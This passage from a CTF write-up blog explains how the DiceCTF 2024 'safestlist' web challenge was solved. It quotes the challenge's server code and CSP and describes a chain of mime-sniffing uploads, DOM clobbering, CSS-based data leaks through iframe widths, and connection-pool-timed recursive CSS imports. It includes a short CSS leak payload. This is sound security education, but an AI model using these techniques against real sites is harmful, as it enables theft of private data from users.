property">onRequest</span><span class="token operator">:</span> requiresLogin<span class="token punctuation">,</span>    <span class="token function-variable function">handler</span><span class="token operator">:</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> body <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">fromEntries</span><span class="token punctuation">(</span>            Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">key</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">[</span>key<span class="token punctuation">,</span> req<span class="token punctuation">.</span>body<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> title<span class="token punctuation">,</span> text <span class="token punctuation">&#125;</span> <span class="token operator">=</span> body<span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> title <span class="token operator">!==</span> <span class="token string">"string"</span> <span class="token operator">||</span> <span class="token keyword">typeof</span> text <span class="token operator">!==</span> <span class="token string">"string"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Title or text must be string"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>title<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">32</span> <span class="token operator">||</span> text<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">512</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Title or text too long"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">const</span> id <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">"hex"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> paste <span class="token operator">=</span> <span class="token punctuation">&#123;</span> id<span class="token punctuation">,</span> title<span class="token punctuation">,</span> text <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>file<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">const</span> filename <span class="token operator">=</span> <span class="token function">sanitizeFilename</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>file<span class="token punctuation">.</span>filename<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"-"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">const</span> ext <span class="token operator">=</span> filename<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span>filename<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token string">".png"</span><span class="token punctuation">,</span> <span class="token string">".jpeg"</span><span class="token punctuation">,</span> <span class="token string">".jpg"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>ext<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Invalid file format for image"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">const</span> buffer <span class="token operator">=</span> <span class="token keyword">await</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>file<span class="token punctuation">.</span><span class="token function">toBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">await</span> fsp<span class="token punctuation">.</span><span class="token function">mkdir</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public'</span><span class="token punctuation">,</span> <span class="token string">'uploads'</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>user<span class="token punctuation">.</span>user<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">await</span> fsp<span class="token punctuation">.</span><span class="token function">writeFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public'</span><span class="token punctuation">,</span> <span class="token string">'uploads'</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>user<span class="token punctuation">.</span>user<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>            paste<span class="token punctuation">.</span>image <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>req<span class="token punctuation">.</span>user<span class="token punctuation">.</span>user<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>filename<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        req<span class="token punctuation">.</span>user<span class="token punctuation">.</span>pastes<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>paste<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">success</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>When uploading a file, it checks if it ends with <code>.png</code>, <code>.jpeg</code>, or <code>.jpg</code>. If not, it throws an error. Although it seems that only images can be uploaded, if the uploaded file has a <code>.png</code> filename, in the old version of fastify static, there won’t be a mimetype, and this challenge doesn’t prohibit mime sniffing, so HTML or CSS files can be uploaded.</p><p>By the way, the CSP for this challenge is as follows:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">fastify<span class="token punctuation">.</span><span class="token function">addHook</span><span class="token punctuation">(</span><span class="token string">'onRequest'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> done</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> users<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        req<span class="token punctuation">.</span>user <span class="token operator">=</span> users<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    res<span class="token punctuation">.</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Security-Policy"</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">        script-src 'sha256-BCut0I6hAnpHxUpwpaDB1crwgr249r2udW3tkBGQLv4=' 'unsafe-inline';        img-src 'self';        style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/css2;        font-src https://fonts.gstatic.com/s/inter/;        frame-ancestors 'none';        object-src 'none';        base-uri 'none';    </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\s+</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Cache-Control"</span><span class="token punctuation">,</span> <span class="token string">"no-cache, no-store"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"X-Frame-Options"</span><span class="token punctuation">,</span> <span class="token string">"DENY"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">done</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Although it seems that <code>script-src</code> has <code>unsafe-inline</code>, it doesn’t actually work. If you try it, you will encounter the following error:</p><pre class="line-numbers language-none"><code class="language-none">refused to execute inline script because it violates the following Content Security Policy directive:&quot;script-src &#39;sha256-BCut0I6hAnpHxUpwpaDB1crwgr249r2udW3tkBGQLv4&#x3D;&#39; &#39;unsafe-inline&#39;&quot;. Note that &#39;unsafe-inline&#39; is ignored if either a hash or nonce value is present in the source list.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Therefore, the only JavaScript that can be used in this challenge is what was originally provided, and everything else needs to be done with CSS.</p><p>Using a technique from another challenge previously released by the author, by using dom clobbering defaultView to determine which page the client router should render, it is possible to inject HTML and CSS into any page. For more details, you can refer to my write-up: <a href="https://blog.huli.tw/2022/08/21/en/corctf-2022-modern-blog-writeup/">corCTF 2022 writeup - modernblog</a>.</p><p>We need to first obtain the post ID that will appear in <code>/home</code>, and then obtain the image path that will appear in <code>/view/:id</code> to retrieve the flag. The length of this post ID is 16 characters, with each character ranging from 0 to f. The challenge is that this post ID is updated with each request.</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">fastify<span class="token punctuation">.</span><span class="token function">route</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'GET'</span><span class="token punctuation">,</span>    <span class="token literal-property property">path</span><span class="token operator">:</span> <span class="token string">'/api/pastes'</span><span class="token punctuation">,</span>    <span class="token literal-property property">onRequest</span><span class="token operator">:</span> requiresLogin<span class="token punctuation">,</span>    <span class="token function-variable function">handler</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        req<span class="token punctuation">.</span>user<span class="token punctuation">.</span>pastes<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">p</span> <span class="token operator">=></span> p<span class="token punctuation">.</span>id <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">"hex"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> req<span class="token punctuation">.</span>user<span class="token punctuation">.</span>pastes<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">&#123;</span> id<span class="token punctuation">,</span> title <span class="token punctuation">&#125;</span></span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">(</span><span class="token punctuation">&#123;</span> id<span class="token punctuation">,</span> title <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>The author’s solution is to use CSS + iframe to leak information from the page. If we only need to leak one character, we can use the width and height, like this:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">  <span class="token selector">body:has(a[href^="/view/1"]) iframe</span> <span class="token punctuation">&#123;</span>    <span class="token property">width</span><span class="token punctuation">:</span> 1px<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token selector">body:has(a[href^="/view/2"]) iframe</span> <span class="token punctuation">&#123;</span>    <span class="token property">width</span><span class="token punctuation">:</span> 2px<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Since there is no frame-src in the CSP, this iframe will be from our origin, and we can use <code>window.innerWidth</code> to determine the width and thus the first character.</p><p>However, the problem is that the ID changes with each request, so we must obtain all the characters within one request, otherwise the ID will be different.</p><p>If we want to leak multiple characters at once, one way is to use the technique mentioned in <a href="https://blog.huli.tw/2023/12/11/en/0ctf-2023-writeup/">0CTF 2023</a>, or another way is recursive import, but this usually requires its own server to work.</p><p>The author, however, solved the latter problem by utilizing the connection pool limit. The connection pool appears frequently in CTF challenges. In simple terms, it fills up all 255 connections in Chromium, allowing control over when the next resource is loaded.</p><p>The approach is as follows:</p><ol><li>First, import the first style (let’s call it <code>.jpg</code>), which will leak the first character and import <code>.png</code>.</li><li>At this point, fill up the connections in our webpage until the first character is leaked and a new style file is uploaded, then release the connections.</li><li>Repeat the above steps continuously.</li></ol><p>The concept should be like this, but there seem to be many implementation details to consider, making it more complex. You can refer to the author’s solution provided at the end for more details.</p><p>After leaking the ID, we can proceed to leak the image path in the same way.</p><p>However, the crucial point is the view note page, which automatically sends a request to delete the image. If an error occurs, an <code>alert</code> will be triggered.</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">import</span> React <span class="token keyword">from</span> <span class="token string">"react"</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token punctuation">&#123;</span> Link<span class="token punctuation">,</span> useParams<span class="token punctuation">,</span> useNavigate <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">"react-router-dom"</span><span class="token punctuation">;</span><span class="token keyword">import</span> axios <span class="token keyword">from</span> <span class="token string">'axios'</span><span class="token punctuation">;</span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">function</span> <span class="token function">View</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> id <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">useParams</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> navigate <span class="token operator">=</span> <span class="token function">useNavigate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> <span class="token punctuation">[</span>paste<span class="token punctuation">,</span> setPaste<span class="token punctuation">]</span> <span class="token operator">=</span> React<span class="token punctuation">.</span><span class="token function">useState</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  React<span class="token punctuation">.</span><span class="token function">useEffect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> r <span class="token operator">=</span> <span class="token keyword">await</span> axios<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">/api/paste/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>id<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>r<span class="token punctuation">.</span>data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token function">setPaste</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>r<span class="token punctuation">.</span>data<span class="token punctuation">.</span>image<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">await</span> <span class="token function">deletePaste</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>data<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token operator">?.</span>response<span class="token operator">?.</span>data<span class="token operator">?.</span>message <span class="token operator">||</span> e<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">navigate</span><span class="token punctuation">(</span><span class="token string">"/home"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> <span class="token function-variable function">deletePaste</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">id</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">await</span> axios<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">/api/destroy/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>id<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token operator">?.</span>response<span class="token operator">?.</span>data<span class="token operator">?.</span>message <span class="token operator">||</span> e<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">navigate</span><span class="token punctuation">(</span><span class="token string">"/home"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>paste<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span></span><span class="token punctuation">></span></span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span></span><span class="token punctuation">></span></span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">></span></span><span class="token punctuation">&#123;</span>paste<span class="token punctuation">.</span>title<span class="token punctuation">&#125;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">></span></span><span class="token plain-text">      </span><span class="token punctuation">&#123;</span> paste<span class="token punctuation">.</span>image <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">&#123;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">/uploads/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>paste<span class="token punctuation">.</span>image<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">&#125;</span></span> <span class="token attr-name">onLoad</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">deletePaste</span><span class="token punctuation">(</span>paste<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span> <span class="token attr-name">onError</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">deletePaste</span><span class="token punctuation">(</span>paste<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mw-100<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>      <span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">style</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">whiteSpace</span><span class="token operator">:</span> <span class="token string">"pre-line"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mb-2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token punctuation">&#123;</span>paste<span class="token punctuation">.</span>text<span class="token punctuation">&#125;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Link</span></span> <span class="token attr-name">to</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/home<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">← Back</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token class-name">Link</span></span><span class="token punctuation">></span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span></span><span class="token punctuation">></span></span>  <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>We can use the CSP <code>connect-src</code> meta tag to block the request to delete the image and use the <code>sandbox</code> attribute of the iframe to prevent the modal from popping up.</p><p>But I think the most difficult part of this challenge is to complete everything within 30 seconds. This means that each step must be automated, which is really challenging.</p><p>Below is the solution provided by the author strellic, and the above explanation is based on their solution:</p><ol><li>Uploading files as .png or .jpg without a mimetype (old version of fastify static) allows for mime sniffing (no xcto), so arbitrary HTML&#x2F;CSS can be uploaded.</li><li>Use the technique from modernblog (clobber defaultView) and upload arbitrary HTML that React Router thinks is a target path. This allows us to add custom HTML onto any page of the React app.</li><li>Now, we need to leak both the flag post ID and username. We do this with CSS injection and iframes.</li><li>We can use CSS to change the width&#x2F;height of an iframe, and since there is no frame-src, we can point it to our own domain and read these values.</li><li>I use <code>window.open</code> to get a window reference, then repeatedly read <code>w.frames[0].innerWidth</code>.</li><li>The only issue is, how do we leak the entire ID if the post IDs change on every refresh?</li><li>Let’s use the classic CSS recursive import (with a twist).</li><li>The issue with recursive import is that you need to import from a server you control. You need this because you need the next CSS file request to stop responding until you leak the previous data so you know what CSS to send. But <code>style-src</code> is set to <code>self</code>, so we can’t stall the next CSS file - or can we?</li><li>My solution: let’s abuse the connection pool! If we block every socket on another tab, we can stop the CSS from importing until we are ready, and we can unblock and reblock the socket pool at will.</li><li>This allows us to control the time at which the next CSS file is uploaded, essentially letting us recreate the recursive CSS technique even when we don’t control the target server!</li><li>This is a little complicated. We need to remove <code>type=&quot;module&quot;</code> from the script tag so it doesn’t block, and move it to the body. Additionally, we have to start the initial CSS request in a style tag (which is why <code>unsafe-inline</code> is there), otherwise it blocks.</li><li>We also need to create a “buffer” of empty CSS files that just request another one so we can account for the initial API requests (as they happen in tandem with the CSS requests).</li><li>With this, you can leak the post ID.</li><li>Now, to leak the username, you do the same technique but need to stop the image from being deleted.</li><li>Use a CSP meta tag with <code>connect-src</code> to stop it from requesting the destroy endpoint.</li><li>But this causes an alert which blocks everything, so you put this in an iframe <code>srcdoc</code> that doesn’t allow modals.</li><li>Do all of this in 30 seconds and you can get the flag! (My solution finishes in 25 seconds with no optimization)</li></ol><h2><span id="afterword">Afterword</span></h2><p>I have been busy with other things lately and haven’t been doing CTF for a while. I feel a bit rusty, but I’m really happy to have solved safestlist. It means my skills haven’t deteriorated too much XD</p><p>In addition, this post is also an update after a two-month gap. It is the first post of 2024. Although it’s a bit late, I still want to wish all readers a happy new year.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Compared to &lt;a href=&quot;https://blog.huli.tw/2023/03/26/en/dicectf-2023-writeup/&quot;&gt;last year&lt;/a&gt; and &lt;a href=&quot;https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/&quot;&gt;the year before&lt;/a&gt;, the difficulty of this year’s web challenges has significantly decreased, making them more approachable and beginner-friendly(It’s good to have both easy and difficult challenges). With the effort of my teammates, we managed to secure the first place, leaving only one web challenge unsolved.&lt;/p&gt;
&lt;p&gt;This time, I only managed to solve the simple “funnylogin” and the challenging “safestlist” challenges. The rest were solved by my teammates. I also took a look at another challenge called “another-csp”. Therefore, this post will only cover the challenges I reviewed and the more difficult ones.&lt;/p&gt;
&lt;p&gt;If you want to see other challenges, you can refer to other people’s writeups:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://nanimokangaeteinai.hateblo.jp/entry/2024/02/06/051003&quot;&gt;st98 - DiceCTF 2024 Quals writeup&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://one3147.tistory.com/77&quot;&gt;0xOne - 2024 Dice CTF Write up [Web]&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
